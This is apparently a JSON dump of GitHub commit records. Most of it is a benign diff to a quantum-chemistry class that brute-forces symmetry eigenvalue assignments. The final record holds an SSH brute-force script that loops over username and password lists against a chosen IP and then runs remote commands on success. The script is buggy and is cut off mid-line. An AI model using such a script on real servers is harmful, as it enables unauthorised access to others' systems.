list(itertools.product([-1,1],repeat=len(unfixed_indices)))\n+            for nu_unfixed in nu_list:\n+                tracker.append(_func(self, np.asarray(nu_unfixed, dtype=int)))\n             return zip(tracker, nu_list)\n-        \n+\n         full_search_results = func(self)\n         (energy, r_optimal), fix_nu = min(full_search_results, key=lambda x:x[0][0])\n+        nu[unfixed_indices] = fix_nu\n         \n-        return energy, fix_nu, r_optimal\n+        return energy, nu, r_optimal\n \n     def solve(self, strategy='brute_force', ref_state: np.array = None) -> None:\n         \"\"\" Minimize the classical objective function, yielding the noncontextual ground state\n","add":24,"remove":8,"filename":"\/symmer\/symplectic\/noncontextual_op.py","badparts":["    def _energy_via_brute_force(self):","        global _func # so concurrent object is avialable in synchronized routine","        def _func(obj, nu):","            nu_list = list(itertools.product([-1,1],repeat=self.symmetry_generators.n_terms))","            for nu in nu_list:","                tracker.append(_func(self, np.array(nu)))","        return energy, fix_nu, r_optimal"],"goodparts":["    def _energy_via_brute_force(self, fixed_indices=None, fixed_eigvals=None):","        if fixed_indices is None:","            fixed_indices = np.array([], dtype=int)","            fixed_eigvals = np.array([], dtype=int)","        else:","            assert fixed_eigvals is not None, 'Must specify the eigenvalues to fix.'","            assert len(fixed_indices) == len(fixed_eigvals), 'Length of eigvals does not match the fixed index list.'","            fixed_indices = np.asarray(fixed_indices, dtype=int)","            fixed_eigvals = np.asarray(fixed_eigvals, dtype=int)","        global unfixed_indices, nu, _func # so concurrent object is avialable in synchronized routine","        nu = np.ones(self.symmetry_generators.n_terms, dtype=int)","        nu[fixed_indices] = fixed_eigvals","        unfixed_indices = np.setdiff1d(np.arange(self.symmetry_generators.n_terms),fixed_indices)    ","        def _func(obj, nu_unfixed):","            nu[unfixed_indices] = nu_unfixed","            nu_list = list(itertools.product([-1,1],repeat=len(unfixed_indices)))","            for nu_unfixed in nu_list:","                tracker.append(_func(self, np.asarray(nu_unfixed, dtype=int)))","        nu[unfixed_indices] = fix_nu","        return energy, nu, r_optimal"]}],"source":"\nimport numpy as np from time import time from functools import reduce from cached_property import cached_property from deco import concurrent, synchronized from scipy.optimize import differential_evolution, shgo from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp from symmer.symplectic.utils import unit_n_sphere_cartesian_coords import itertools class NoncontextualOp(PauliwordOp): \"\"\" Class for representing noncontextual Hamiltonians Noncontextual Hamiltonians are precisely those whose terms may be reconstructed under the Jordan product(AB={A, B}\/2) from a generating set of the form G \u222a{C_1,..., C_M} where{C_i, C_j}=0 for i !=j and G commutes universally. Refer to https:\/\/arxiv.org\/abs\/1904.02260 for further details. \"\"\" def __init__(self, symp_matrix, coeff_vec ): \"\"\" \"\"\" super().__init__(symp_matrix, coeff_vec) assert(self.is_noncontextual), 'Specified operator is contextual.' self.symmetry_generators, self.clique_operator=self.noncontextual_basis() self.noncontextual_reconstruction() @classmethod def from_PauliwordOp(cls, H): \"\"\" for convenience, initialize from an existing PauliwordOp \"\"\" noncontextual_operator=cls( H.symp_matrix, H.coeff_vec ) return noncontextual_operator @classmethod def from_hamiltonian(cls, H: PauliwordOp, strategy: str='diag', basis: PauliwordOp=None, DFS_runtime: int=10 ) -> \"NoncontextualOp\": \"\"\" Given a PauliwordOp, extract from it a noncontextual sub-Hamiltonian by the specified strategy \"\"\" if strategy=='diag': return cls._diag_noncontextual_op(H) elif strategy=='basis': return cls._from_basis_noncontextual_op(H, basis) elif strategy.find('DFS') !=-1: _, strategy=strategy.split('_') return cls._dfs_noncontextual_op(H, strategy=strategy, runtime=DFS_runtime) elif strategy.find('SingleSweep') !=-1: _, strategy=strategy.split('_') return cls._single_sweep_noncontextual_operator(H, strategy=strategy) else: raise ValueError(f'Unrecognised noncontextual operator strategy{strategy}') @classmethod def _diag_noncontextual_op(cls, H: PauliwordOp): \"\"\" Return the diagonal terms of the PauliwordOp -this is the simplest noncontextual operator \"\"\" mask_diag=np.where(~np.any(H.X_block, axis=1)) noncontextual_operator=cls( H.symp_matrix[mask_diag], H.coeff_vec[mask_diag] ) return noncontextual_operator @classmethod def _dfs_noncontextual_op(cls, H: PauliwordOp, runtime=10, strategy='magnitude'): \"\"\" function orders operator by coeff mag then going from first term adds ops to a pauliword op ensuring it is noncontextual adds to a tracking list and then changes the original ordering so first term is now at the end repeats from the start(aka generating a list of possible noncon Hamiltonians) from this list one can then choose the noncon op with the most terms OR largest sum of abs coeff weights cutoff time ensures if the number of possibilities is large the function will STOP and not take too long \"\"\" operator=H.sort(by='magnitude') noncontextual_ops=[] n=0 start_time=time() while n < H.n_terms and time()-start_time < runtime: order=np.roll(np.arange(H.n_terms), -n) ordered_operator=PauliwordOp( symp_matrix=operator.symp_matrix[order], coeff_vec=operator.coeff_vec[order] ) noncontextual_operator=PauliwordOp.empty(H.n_qubits) for op in ordered_operator: noncon_check=noncontextual_operator +op if noncon_check.is_noncontextual: noncontextual_operator +=op noncontextual_ops.append(noncontextual_operator) n+=1 if strategy=='magnitude': noncontextual_operator=sorted(noncontextual_ops, key=lambda x:-np.sum(abs(x.coeff_vec)))[0] elif strategy=='largest': noncontextual_operator=sorted(noncontextual_ops, key=lambda x:-x.n_terms)[0] else: raise ValueError('Unrecognised noncontextual operator strategy.') return cls.from_PauliwordOp(noncontextual_operator) @classmethod def _diag_first_noncontextual_op(cls, H: PauliwordOp): \"\"\" Start from the diagonal noncontextual form and append additional off-diagonal contributions with respect to their coefficient magnitude. \"\"\" noncontextual_operator=cls._diag_noncontextual_op(H) off_diag_terms=(H -noncontextual_operator).sort(by='magnitude') for term in off_diag_terms: if(noncontextual_operator+term).is_noncontextual: noncontextual_operator+=term return cls.from_PauliwordOp(noncontextual_operator) @classmethod def _single_sweep_noncontextual_operator(cls, H, strategy='magnitude'): \"\"\" Order the operator by some sorting key(magnitude, random or CurrentOrder) and then sweep accross the terms, appending to a growing noncontextual operator whenever possible. \"\"\" noncontextual_operator=PauliwordOp.empty(H.n_qubits) if strategy=='magnitude': operator=H.sort(by='magnitude') elif strategy=='random': order=np.arange(H.n_terms) np.random.shuffle(order) operator=PauliwordOp( H.symp_matrix[order], H.coeff_vec[order] ) elif strategy=='CurrentOrder': operator=H else: raise ValueError('Unrecognised strategy, must be one of magnitude, random or CurrentOrder') for op in operator: test=noncontextual_operator +op if test.is_noncontextual: noncontextual_operator +=op return cls.from_PauliwordOp(noncontextual_operator) @classmethod def _from_basis_noncontextual_op(cls, H: PauliwordOp, basis: PauliwordOp): \"\"\" Construct a noncontextual operator given a noncontextual basis, via the Jordan product( regular matrix product if the operators commute, and equal to zero if the operators anticommute.) \"\"\" assert basis is not None, 'Must specify a noncontextual basis.' assert basis.is_noncontextual, 'Basis is contextual.' symmetry_mask=np.all(basis.adjacency_matrix, axis=1) S=basis[symmetry_mask] aug_basis_reconstruction_masks=[ H.basis_reconstruction(S+c)[1] for c in basis[~symmetry_mask] ] noncontextual_terms_mask=np.any(np.array(aug_basis_reconstruction_masks), axis=0) return cls.from_PauliwordOp(H[noncontextual_terms_mask]) def noncontextual_basis(self) -> StabilizerOp: \"\"\" Find an independent *generating set* for the noncontextual symmetry * technically not a basis! \"\"\" self.decomposed={} symmetry_generators=StabilizerOp.symmetry_basis(self) reconstructed_indices, succesfully_reconstructed=self.basis_reconstruction(symmetry_generators) universal_operator=PauliwordOp(self.symp_matrix[succesfully_reconstructed], self.coeff_vec[succesfully_reconstructed]) self.decomposed['symmetry']=universal_operator clique_union=self -universal_operator if clique_union.n_terms !=0: clique_characters, clique_inverse_map=np.unique(clique_union.adjacency_matrix, axis=0, return_inverse=True) clique_reps=[] for i in np.unique(clique_inverse_map): Ci_indices=np.where(clique_inverse_map==i)[0] Ci_symp,Ci_coeff=clique_union.symp_matrix[Ci_indices],clique_union.coeff_vec[Ci_indices] Ci_operator=PauliwordOp(Ci_symp, Ci_coeff) self.decomposed[f'clique_{i}']=Ci_operator clique_reps.append(Ci_operator.symp_matrix[0]) clique_reps=np.vstack(clique_reps) self.n_cliques=clique_reps.shape[0] clique_operator=AntiCommutingOp(clique_reps, np.ones(self.n_cliques)) else: clique_operator=None self.n_cliques =0 return symmetry_generators, clique_operator def noncontextual_reconstruction(self): \"\"\" Reconstruct the noncontextual operator in each independent basis GuCi -one for every clique. This mitigates against dependency between the symmetry generators G and the clique representatives Ci \"\"\" if self.n_cliques > 0: reconstruction_ind_matrix=np.zeros( [self.n_terms, self.symmetry_generators.n_terms +self.n_cliques] ) for index, Ci in enumerate(self.clique_operator): clique_column_index=self.symmetry_generators.n_terms+index col_mask_inds=np.append( np.arange(self.symmetry_generators.n_terms), clique_column_index ) GuCi_symp=np.vstack([self.symmetry_generators.symp_matrix, Ci.symp_matrix]) GuCi=StabilizerOp(GuCi_symp) reconstructed, row_mask_inds=self.basis_reconstruction(GuCi) row_col_mask=np.ix_(row_mask_inds, col_mask_inds) reconstruction_ind_matrix[row_col_mask]=reconstructed[row_mask_inds] else: ( reconstruction_ind_matrix, succesfully_reconstructed )=self.basis_reconstruction(self.symmetry_generators) G_part=reconstruction_ind_matrix[:,:self.symmetry_generators.n_terms] r_part=reconstruction_ind_matrix[:,self.symmetry_generators.n_terms:] pauli_mult_signs=np.ones(self.n_terms) for index,(G, r) in enumerate(zip(G_part, r_part)): G_inds=np.where(G!=0)[0] r_inds=np.where(r!=0)[0] G_component=self.symmetry_generators.symp_matrix[G_inds] if self.n_cliques > 0: r_component=self.clique_operator.symp_matrix[r_inds] all_factors_symp_matrix=np.vstack([G_component, r_component]) else: all_factors_symp_matrix=G_component all_factors=PauliwordOp( all_factors_symp_matrix, np.ones(all_factors_symp_matrix.shape[0]) ) if all_factors.n_terms > 0: gen_mult=reduce(lambda x,y:x*y, list(all_factors)) pauli_mult_signs[index]=int(gen_mult.coeff_vec.real[0]) self.G_indices, self.r_indices, self.pauli_mult_signs=G_part, r_part, pauli_mult_signs def noncontextual_objective_function(self, nu: np.array, r: np.array ) -> float: \"\"\" The classical objective function that encodes the noncontextual energies \"\"\" nu=np.asarray(nu) G_prod=(-1)**np.count_nonzero(np.logical_and(self.G_indices==1, nu==-1), axis=1) r_part=np.sum(self.r_indices*r, axis=1) r_part[np.where(r_part==0)]=1 return np.sum(self.coeff_vec*G_prod*r_part*self.pauli_mult_signs).real def _convex_problem(self, nu): \"\"\" given +\/-1 value assignments nu, solve for the clique operator coefficients. Note that, with nu fixed, the optimization problem is now convex. \"\"\" if self.n_cliques==0: optimized_energy=self.noncontextual_objective_function(nu=nu, r=None) r_optimal=None else: r_bounds=[(0, np.pi)]*(self.n_cliques-2)+[(0, 2*np.pi)] optimizer_output=differential_evolution( func=lambda angles:self.noncontextual_objective_function( nu, unit_n_sphere_cartesian_coords(angles) ), bounds=r_bounds ) optimized_energy=optimizer_output['fun'] optimized_angles=optimizer_output['x'] r_optimal=unit_n_sphere_cartesian_coords(optimized_angles) return optimized_energy, r_optimal def _energy_via_ref_state(self, ref_state): \"\"\" Given a reference state such as Hartree-Fock, fix the symmetry generator eigenvalues \"\"\" self.symmetry_generators.update_sector(ref_state=ref_state) fix_nu=self.symmetry_generators.coeff_vec energy, r_optimal=self._convex_problem(fix_nu) return energy, fix_nu, r_optimal def _energy_via_relaxation(self): \"\"\" Relax the binary value assignment of symmetry generators to continuous variables \"\"\" nu_bounds=[(0, np.pi)]*self.symmetry_generators.n_terms optimizer_output=shgo(func=lambda angles:self._convex_problem(np.cos(angles))[0], bounds=nu_bounds) fix_nu=np.sign(np.array(np.cos(optimizer_output['x']))).astype(int) self.symmetry_generators.coeff_vec=fix_nu energy, r_optimal=self._convex_problem(fix_nu) return energy, fix_nu, r_optimal def _energy_via_brute_force(self): \"\"\" Does what is says on the tin! Try every single eigenvalue assignment in parallel and return the minimizing noncontextual configuration. This scales exponentially in the number of qubits. \"\"\" global _func @concurrent def _func(obj, nu): return obj._convex_problem(nu) @synchronized def func(self): tracker=[] nu_list=list(itertools.product([-1,1],repeat=self.symmetry_generators.n_terms)) for nu in nu_list: tracker.append(_func(self, np.array(nu))) return zip(tracker, nu_list) full_search_results=func(self) (energy, r_optimal), fix_nu=min(full_search_results, key=lambda x:x[0][0]) return energy, fix_nu, r_optimal def solve(self, strategy='brute_force', ref_state: np.array=None) -> None: \"\"\" Minimize the classical objective function, yielding the noncontextual ground state \"\"\" if ref_state is not None: self.energy, nu, r=self._energy_via_ref_state(ref_state) elif strategy=='binary_relaxation': self.energy, nu, r=self._energy_via_relaxation() elif strategy=='brute_force': self.energy, nu, r=self._energy_via_brute_force() else: raise ValueError(f'unknown optimization strategy:{strategy}') self.symmetry_generators.coeff_vec=nu if r is not None: self.clique_operator.coeff_vec=r ","sourceWithComments":"import numpy as np\nfrom time import time\nfrom functools import reduce\nfrom cached_property import cached_property\nfrom deco import concurrent, synchronized\nfrom scipy.optimize import differential_evolution, shgo\nfrom symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp\nfrom symmer.symplectic.utils import unit_n_sphere_cartesian_coords\nimport itertools\n\nclass NoncontextualOp(PauliwordOp):\n    \"\"\" Class for representing noncontextual Hamiltonians\n\n    Noncontextual Hamiltonians are precisely those whose terms may be reconstructed \n    under the Jordan product (AB = {A, B}\/2) from a generating set of the form \n    G \u222a {C_1, ..., C_M} where {C_i, C_j}=0 for i != j and G commutes universally.\n    Refer to https:\/\/arxiv.org\/abs\/1904.02260 for further details. \n    \n    \"\"\"\n    def __init__(self,\n            symp_matrix,\n            coeff_vec\n        ):\n        \"\"\"\n        \"\"\"\n        super().__init__(symp_matrix, coeff_vec)\n        assert(self.is_noncontextual), 'Specified operator is contextual.'\n        self.symmetry_generators, self.clique_operator = self.noncontextual_basis()\n        # Reconstruct the noncontextual Hamiltonian into its G and C(r) components\n        self.noncontextual_reconstruction()\n        # determine the noncontextual ground state - this updates the coefficients of the clique \n        # representative operator C(r) and symmetry generators G with the optimal configuration\n        \n    @classmethod\n    def from_PauliwordOp(cls, H):\n        \"\"\" for convenience, initialize from an existing PauliwordOp\n        \"\"\"\n        noncontextual_operator = cls(\n            H.symp_matrix,\n            H.coeff_vec\n        )\n        return noncontextual_operator\n\n    @classmethod\n    def from_hamiltonian(cls, \n            H: PauliwordOp, \n            strategy: str = 'diag', \n            basis: PauliwordOp = None, \n            DFS_runtime: int = 10\n        ) -> \"NoncontextualOp\":\n        \"\"\" Given a PauliwordOp, extract from it a noncontextual sub-Hamiltonian by the specified strategy\n        \"\"\"\n        if strategy == 'diag':\n            return cls._diag_noncontextual_op(H)\n        elif strategy == 'basis':\n            return cls._from_basis_noncontextual_op(H, basis)\n        elif strategy.find('DFS') != -1:\n            _, strategy = strategy.split('_')\n            return cls._dfs_noncontextual_op(H, strategy=strategy, runtime=DFS_runtime)\n        elif strategy.find('SingleSweep') != -1:\n            _, strategy = strategy.split('_')\n            return cls._single_sweep_noncontextual_operator(H, strategy=strategy)\n        else:\n            raise ValueError(f'Unrecognised noncontextual operator strategy {strategy}')\n\n    @classmethod\n    def _diag_noncontextual_op(cls, H: PauliwordOp):\n        \"\"\" Return the diagonal terms of the PauliwordOp - this is the simplest noncontextual operator\n        \"\"\"\n        mask_diag = np.where(~np.any(H.X_block, axis=1))\n        noncontextual_operator = cls(\n            H.symp_matrix[mask_diag],\n            H.coeff_vec[mask_diag]\n        )\n        return noncontextual_operator\n\n    @classmethod\n    def _dfs_noncontextual_op(cls, H: PauliwordOp, runtime=10, strategy='magnitude'):\n        \"\"\" function orders operator by coeff mag\n        then going from first term adds ops to a pauliword op ensuring it is noncontextual\n        adds to a tracking list and then changes the original ordering so first term is now at the end\n        repeats from the start (aka generating a list of possible noncon Hamiltonians)\n        from this list one can then choose the noncon op with the most terms OR largest sum of abs coeff weights\n        cutoff time ensures if the number of possibilities is large the function will STOP and not take too long\n\n        \"\"\"\n        operator = H.sort(by='magnitude')\n        noncontextual_ops = []\n\n        n=0\n        start_time = time()\n        while n < H.n_terms and time()-start_time < runtime:\n            order = np.roll(np.arange(H.n_terms), -n)\n            ordered_operator = PauliwordOp(\n                symp_matrix=operator.symp_matrix[order],\n                coeff_vec=operator.coeff_vec[order]\n            )\n            noncontextual_operator = PauliwordOp.empty(H.n_qubits)\n            for op in ordered_operator:\n                noncon_check = noncontextual_operator + op\n                if noncon_check.is_noncontextual:\n                    noncontextual_operator += op\n            noncontextual_ops.append(noncontextual_operator)\n            n+=1\n\n        if strategy == 'magnitude':\n            noncontextual_operator = sorted(noncontextual_ops, key=lambda x:-np.sum(abs(x.coeff_vec)))[0]\n        elif strategy == 'largest':\n            noncontextual_operator = sorted(noncontextual_ops, key=lambda x:-x.n_terms)[0]\n        else:\n            raise ValueError('Unrecognised noncontextual operator strategy.')\n\n        return cls.from_PauliwordOp(noncontextual_operator)\n\n    @classmethod\n    def _diag_first_noncontextual_op(cls, H: PauliwordOp):\n        \"\"\" Start from the diagonal noncontextual form and append additional off-diagonal\n        contributions with respect to their coefficient magnitude.\n        \"\"\"\n        noncontextual_operator = cls._diag_noncontextual_op(H)\n        # order the remaining terms by coefficient magnitude\n        off_diag_terms = (H - noncontextual_operator).sort(by='magnitude')\n        # append terms that do not make the noncontextual_operator contextual!\n        for term in off_diag_terms:\n            if (noncontextual_operator+term).is_noncontextual:\n                noncontextual_operator+=term\n        \n        return cls.from_PauliwordOp(noncontextual_operator)\n\n    @classmethod\n    def _single_sweep_noncontextual_operator(cls, H, strategy='magnitude'):\n        \"\"\" Order the operator by some sorting key (magnitude, random or CurrentOrder)\n        and then sweep accross the terms, appending to a growing noncontextual operator\n        whenever possible.\n        \"\"\"\n        noncontextual_operator = PauliwordOp.empty(H.n_qubits)\n        \n        if strategy=='magnitude':\n            operator = H.sort(by='magnitude')\n        elif strategy=='random':\n            order = np.arange(H.n_terms)\n            np.random.shuffle(order)\n            operator = PauliwordOp(\n                H.symp_matrix[order],\n                H.coeff_vec[order]\n            )\n        elif strategy =='CurrentOrder':\n            operator = H\n        else:\n            raise ValueError('Unrecognised strategy, must be one of magnitude, random or CurrentOrder')            \n\n        for op in operator:\n            test = noncontextual_operator + op\n            if test.is_noncontextual:\n                noncontextual_operator += op\n        \n        return cls.from_PauliwordOp(noncontextual_operator)\n\n    @classmethod\n    def _from_basis_noncontextual_op(cls, H: PauliwordOp, basis: PauliwordOp):\n        \"\"\" Construct a noncontextual operator given a noncontextual basis, via the Jordan product ( regular matrix product if the operators commute, and equal to zero if the operators anticommute.)\n        \"\"\"\n        assert basis is not None, 'Must specify a noncontextual basis.'\n        assert basis.is_noncontextual, 'Basis is contextual.'\n        \n        symmetry_mask = np.all(basis.adjacency_matrix, axis=1)\n        S = basis[symmetry_mask]\n        aug_basis_reconstruction_masks = [\n            H.basis_reconstruction(S+c)[1]  for c in basis[~symmetry_mask]\n        ]\n        noncontextual_terms_mask = np.any(np.array(aug_basis_reconstruction_masks), axis=0)\n        return cls.from_PauliwordOp(H[noncontextual_terms_mask])\n\n    def noncontextual_basis(self) -> StabilizerOp:\n        \"\"\" Find an independent *generating set* for the noncontextual symmetry\n        * technically not a basis!\n        \"\"\"\n        self.decomposed = {}\n        # identify a basis of universally commuting operators\n        symmetry_generators = StabilizerOp.symmetry_basis(self)\n        # try to reconstruct the noncontextual operator in this basis\n        # not all terms can be decomposed in this basis, so check which can\n        reconstructed_indices, succesfully_reconstructed = self.basis_reconstruction(symmetry_generators)\n        # extract the universally commuting noncontextual terms (i.e. those which may be constructed from symmetry generators)\n        universal_operator = PauliwordOp(self.symp_matrix[succesfully_reconstructed],\n                                         self.coeff_vec[succesfully_reconstructed])\n        self.decomposed['symmetry'] = universal_operator\n        # identify the anticommuting cliques\n        clique_union = self - universal_operator\n        if clique_union.n_terms != 0:\n            # identify unique rows in the adjacency matrix with inverse mapping \n            # so that terms of the same clique have matching indices\n            clique_characters, clique_inverse_map = np.unique(clique_union.adjacency_matrix, axis=0, return_inverse=True)\n            clique_reps = []\n            for i in np.unique(clique_inverse_map):\n                # mask each clique and select a class represetative for its contribution in the noncontextual basis\n                Ci_indices = np.where(clique_inverse_map==i)[0]\n                Ci_symp,Ci_coeff = clique_union.symp_matrix[Ci_indices],clique_union.coeff_vec[Ci_indices]\n                Ci_operator = PauliwordOp(Ci_symp, Ci_coeff)\n                self.decomposed[f'clique_{i}'] = Ci_operator\n                # choose cliques representative that maximises basis_score (summed coefficients of commuting terms)\n                clique_reps.append(Ci_operator.symp_matrix[0])\n            clique_reps = np.vstack(clique_reps)\n            self.n_cliques = clique_reps.shape[0]\n            clique_operator = AntiCommutingOp(clique_reps, np.ones(self.n_cliques))\n        else:\n            clique_operator = None\n            self.n_cliques  = 0\n\n        return symmetry_generators, clique_operator\n\n    def noncontextual_reconstruction(self):\n        \"\"\" Reconstruct the noncontextual operator in each independent basis GuCi - one for every clique.\n        This mitigates against dependency between the symmetry generators G and the clique representatives Ci\n        \"\"\"\n        if self.n_cliques > 0:\n            reconstruction_ind_matrix = np.zeros(\n                [self.n_terms, self.symmetry_generators.n_terms + self.n_cliques]\n            )\n            # Cannot simultaneously know eigenvalues of cliques so zero rows with more than one clique\n            # therefore, we decompose the noncontextual terms in the respective independent bases\n            for index, Ci in enumerate(self.clique_operator):\n                clique_column_index = self.symmetry_generators.n_terms+index\n                col_mask_inds = np.append(\n                    np.arange(self.symmetry_generators.n_terms), clique_column_index\n                )\n                GuCi_symp = np.vstack([self.symmetry_generators.symp_matrix, Ci.symp_matrix])\n                GuCi = StabilizerOp(GuCi_symp)\n                reconstructed, row_mask_inds = self.basis_reconstruction(GuCi)\n                row_col_mask = np.ix_(row_mask_inds, col_mask_inds)\n                reconstruction_ind_matrix[row_col_mask] = reconstructed[row_mask_inds]\n        else:\n            (\n                reconstruction_ind_matrix, \n                succesfully_reconstructed\n            ) = self.basis_reconstruction(self.symmetry_generators)\n        \n        G_part = reconstruction_ind_matrix[:,:self.symmetry_generators.n_terms]\n        r_part = reconstruction_ind_matrix[:,self.symmetry_generators.n_terms:]\n        # individual elements of r_part commute with all of G_part - taking products over G_part with\n        # a single element of r_part will therefore never produce a complex phase, but might result in\n        # a sign slip that must be accounted for in the basis reconstruction TODO: add to basis_reconstruction!\n        pauli_mult_signs = np.ones(self.n_terms)\n        for index, (G, r) in enumerate(zip(G_part, r_part)):\n            G_inds = np.where(G!=0)[0]\n            r_inds = np.where(r!=0)[0]\n            G_component = self.symmetry_generators.symp_matrix[G_inds]\n            if self.n_cliques > 0:\n                r_component = self.clique_operator.symp_matrix[r_inds]\n                all_factors_symp_matrix = np.vstack([G_component, r_component])\n            else:\n                all_factors_symp_matrix = G_component\n            all_factors = PauliwordOp(\n                all_factors_symp_matrix,\n                np.ones(all_factors_symp_matrix.shape[0])\n            )\n            if all_factors.n_terms > 0:\n                gen_mult = reduce(lambda x,y:x*y, list(all_factors))\n                pauli_mult_signs[index] = int(gen_mult.coeff_vec.real[0])\n        self.G_indices, self.r_indices, self.pauli_mult_signs = G_part, r_part, pauli_mult_signs\n\n    def noncontextual_objective_function(self, \n            nu: np.array, \n            r: np.array\n        ) -> float:\n        \"\"\" The classical objective function that encodes the noncontextual energies\n        \"\"\"\n        nu = np.asarray(nu) # must be an array!\n        G_prod = (-1)**np.count_nonzero(np.logical_and(self.G_indices==1, nu == -1), axis=1)\n        r_part = np.sum(self.r_indices*r, axis=1)\n        r_part[np.where(r_part==0)]=1\n        return np.sum(self.coeff_vec*G_prod*r_part*self.pauli_mult_signs).real\n\n    def _convex_problem(self, nu):\n        \"\"\" given +\/-1 value assignments nu, solve for the clique operator coefficients.\n        Note that, with nu fixed, the optimization problem is now convex.\n        \"\"\"\n        if self.n_cliques==0:\n            optimized_energy = self.noncontextual_objective_function(nu=nu, r=None)\n            r_optimal = None\n        else:\n            # given M cliques, optimize over the unit (M-1)-sphere and convert to cartesians for the r vector\n            r_bounds = [(0, np.pi)]*(self.n_cliques-2)+[(0, 2*np.pi)]\n            optimizer_output = differential_evolution(\n                func=lambda angles:self.noncontextual_objective_function(\n                    nu, unit_n_sphere_cartesian_coords(angles)\n                    ), \n                bounds=r_bounds\n            )\n            optimized_energy = optimizer_output['fun']\n            optimized_angles = optimizer_output['x']\n            r_optimal = unit_n_sphere_cartesian_coords(optimized_angles)\n\n        return optimized_energy, r_optimal\n\n    def _energy_via_ref_state(self, ref_state):\n        \"\"\" Given a reference state such as Hartree-Fock, fix the symmetry generator eigenvalues\n        \"\"\"\n        # update the symmetry generator G coefficients w.r.t. the reference state\n        self.symmetry_generators.update_sector(ref_state=ref_state)\n        fix_nu = self.symmetry_generators.coeff_vec\n        energy, r_optimal = self._convex_problem(fix_nu)\n        return energy, fix_nu, r_optimal\n\n    def _energy_via_relaxation(self):\n        \"\"\" Relax the binary value assignment of symmetry generators to continuous variables\n        \"\"\"\n        # optimize discrete value assignments nu by relaxation to continuous variables\n        nu_bounds = [(0, np.pi)]*self.symmetry_generators.n_terms\n        optimizer_output = shgo(func=lambda angles:self._convex_problem(np.cos(angles))[0], bounds=nu_bounds)\n        # if optimization was successful the optimal angles should consist of 0 and pi\n        fix_nu = np.sign(np.array(np.cos(optimizer_output['x']))).astype(int)\n        self.symmetry_generators.coeff_vec = fix_nu \n        energy, r_optimal = self._convex_problem(fix_nu)\n        return energy, fix_nu, r_optimal\n\n    def _energy_via_brute_force(self):\n        \"\"\" Does what is says on the tin! Try every single eigenvalue assignment in parallel\n        and return the minimizing noncontextual configuration. This scales exponentially in \n        the number of qubits.\n        \"\"\"\n\n        global _func # so concurrent object is avialable in synchronized routine\n\n        # wrap the convex optimization problem for compatibility with deco\n        @concurrent\n        def _func(obj, nu):\n            return obj._convex_problem(nu)\n\n        @synchronized\n        def func(self):\n            # optimize over all discrete value assignments of nu in parallel\n            tracker = []\n            nu_list = list(itertools.product([-1,1],repeat=self.symmetry_generators.n_terms))\n            for nu in nu_list:\n                tracker.append(_func(self, np.array(nu)))\n            return zip(tracker, nu_list)\n        \n        full_search_results = func(self)\n        (energy, r_optimal), fix_nu = min(full_search_results, key=lambda x:x[0][0])\n        \n        return energy, fix_nu, r_optimal\n\n    def solve(self, strategy='brute_force', ref_state: np.array = None) -> None:\n        \"\"\" Minimize the classical objective function, yielding the noncontextual ground state\n        \"\"\"\n        if ref_state is not None:\n            self.energy, nu, r = self._energy_via_ref_state(ref_state)\n        elif strategy=='binary_relaxation' :\n            self.energy, nu, r = self._energy_via_relaxation()\n        elif strategy=='brute_force' :\n            self.energy, nu, r = self._energy_via_brute_force()\n        else:\n            raise ValueError(f'unknown optimization strategy: {strategy}')\n        \n        # optimize the clique operator coefficients\n        self.symmetry_generators.coeff_vec = nu\n        if r is not None:\n            self.clique_operator.coeff_vec = r"}},"msg":"Updated NoncontextualOp so that only the symmetry generators that have the reference state as an eigenvalue are fixed - the remaining symmetry generators are solved via brute force."}},"https:\/\/github.com\/glitch422\/Python-Tools":{"23ce6f9b49f4afe2cb88dc349c8aa82f67856a21":{"url":"https:\/\/api.github.com\/repos\/glitch422\/Python-Tools\/commits\/23ce6f9b49f4afe2cb88dc349c8aa82f67856a21","html_url":"https:\/\/github.com\/glitch422\/Python-Tools\/commit\/23ce6f9b49f4afe2cb88dc349c8aa82f67856a21","sha":"23ce6f9b49f4afe2cb88dc349c8aa82f67856a21","keyword":"brute force update","diff":"diff --git a\/SSH_Brute_Force.py b\/SSH_Brute_Force.py\nindex e169d2c..1749dd6 100644\n--- a\/SSH_Brute_Force.py\n+++ b\/SSH_Brute_Force.py\n@@ -1,6 +1,4 @@\n-from scapy.all import *\n-from scapy.layers.inet import TCP, IP, sr, ICMP\n-from scapy.layers.l2 import ARP, Ether, srp1\n+import paramiko\n \n username = input('Please insert the user name list:\\t')\n password = input('Please insert the password list:\\t')\n","message":"","files":{"\/SSH_Brute_Force.py":{"changes":[{"diff":"\n-from scapy.all import *\n-from scapy.layers.inet import TCP, IP, sr, ICMP\n-from scapy.layers.l2 import ARP, Ether, srp1\n+import paramiko\n \n username = input('Please insert the user name list:\\t')\n password = input('Please insert the password list:\\t')\n","add":1,"remove":3,"filename":"\/SSH_Brute_Force.py","badparts":["from scapy.all import *","from scapy.layers.inet import TCP, IP, sr, ICMP","from scapy.layers.l2 import ARP, Ether, srp1"],"goodparts":["import paramiko"]}],"source":"\nfrom scapy.all import * from scapy.layers.inet import TCP, IP, sr, ICMP from scapy.layers.l2 import ARP, Ether, srp1 username=input('Please insert the user name list:\\t') password=input('Please insert the password list:\\t') ip=input(\"Please insert the IP address to communication:\\t\") port=22 with open(username, 'r') as userlist: for u in userlist: u=''.join(u.split(\"\\n\")) with open(password, 'r') as passlist: for p in passlist: p=''.join(p.split(\"\\n\")) try: ssh_session=paramiko.SSHClient() ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy) ssh_session.connect(ip, port, username, password) print(f'Login success!\\nUsername:{username}, Password:{password}') while True: command=input('Insert a command to execute on the server:\\t') stdin, stdout, stderr=ssh_session.exec_command(command) print(stdout.read().decode()) print(stderr.read().decode()) end=input('Do you want to finish y\/n?\\t').lower()[0] if end=='y': break except Exception as e: print(e) ","sourceWithComments":"from scapy.all import *\nfrom scapy.layers.inet import TCP, IP, sr, ICMP\nfrom scapy.layers.l2 import ARP, Ether, srp1\n\nusername = input('Please insert the user name list:\\t')\npassword = input('Please insert the password list:\\t')\nip = input(\"Please insert the IP address to communication:\\t\")\nport = 22\nwith open(username, 'r') as userlist:\n    for u in userlist:\n        u = ''.join(u.split(\"\\n\"))\n        with open(password, 'r') as passlist:\n            for p in passlist:\n                p = ''.join(p.split(\"\\n\"))\n                try:\n                    ssh_session = paramiko.SSHClient()\n                    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)\n                    ssh_session.connect(ip, port, username, password)\n                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n                    while True:\n                        command = 